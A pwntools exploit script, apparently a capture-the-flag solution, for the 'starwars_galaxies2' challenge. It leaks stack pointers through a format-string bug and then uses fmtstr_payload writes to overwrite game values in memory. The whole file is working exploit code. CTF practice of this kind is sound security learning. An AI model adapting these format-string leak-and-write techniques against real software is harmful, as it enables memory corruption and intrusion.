#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
HOST = "0.cloud.chals.io"
PORT = 34916
CHALL_BIN = "./starwars_galaxies2"
context.log_level = "DEBUG"
gs = '''
b view_player
c
'''
context.binary = ELF(CHALL_BIN, checksec=False)
elf = context.binary

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    elif args.LOCAL:
        return process([elf.path])
    else:
        return gdb.debug([elf.path], gdbscript=gs)

def create(name, id_):
    io.sendline("0")
    io.sendlineafter("name: ", name)
    io.sendlineafter("number: ", str(id_))
    io.sendlineafter("class: ", str(0))

def fsb(payload, id_=0):
    create(payload, id_)
    io.sendline("2")
    io.recv()


def exploit():
    create("%7$p,%25$p", 0)
    io.recv()
    io.sendline("2")
    leak = io.recvuntil(",")[0:-1]
    player = int(leak, 16)
    leak = io.recvline()[0:-1]
    boss = int(leak, 16)
    print("player: ", hex(player))
    print("boss: ", hex(boss))

    payload = fmtstr_payload(8, {boss:0x61}, numbwritten=0, write_size="short")
    fsb(payload)
    payload = fmtstr_payload(8, {player+0x82:0xffff}, numbwritten=0, write_size="short")
    fsb(payload, 0xfc18)
    io.sendline("1")
    

io = start()
exploit()
io.interactive()
